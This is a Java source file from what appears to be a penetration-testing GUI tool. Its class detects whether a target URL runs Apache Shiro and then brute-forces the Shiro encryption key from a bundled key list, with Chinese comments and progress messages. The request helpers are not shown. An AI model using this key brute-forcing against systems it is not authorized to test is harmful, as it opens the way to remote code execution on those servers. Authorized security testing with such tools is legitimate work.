package core;

import common.AesCbcEncrypt;
import common.HttpUtils;
import entity.ControllersFactory;
import ui.MyController;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Map;

public class ShiroKeyBrute {

    final private MyController myController = (MyController) ControllersFactory.controllers.get(MyController.class.getSimpleName());
    final private Map<String,String> paramContext = ControllersFactory.paramsContext;
    private HttpUtils httpUtils = new HttpUtils();

    // 思路应该是这样的 ，首先进行检测是否是 Shiro 框架，如果是的话就开始爆破，如果不是的话那么就不爆破了

    public void shiroDetect(String url) throws Exception{
        String method = paramContext.get("Method");
        boolean tag = false;
        boolean flag = false;

        // 首先判断是不是Shiro框架
        tag = this.httpUtils.shiroDetectRequest(method,url);
        if (tag == true){
            this.myController.result.appendText("[+] 开始爆破密钥\n");
            InputStream inputStream = ShiroKeyBrute.class.getClassLoader().getResourceAsStream("ShiroKeys.txt");
            if (inputStream != null){
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String key = null;
                while ((key = reader.readLine()) != null){
                    flag = this.httpUtils.shiroKeyBruteRequest(method,url,key);
                    if (flag == true){
                        break;
                    }
                }
            }
            if (flag == false){
                this.myController.result.appendText("[!] 密钥爆破失败\n\n");
            }
        }


    }
}
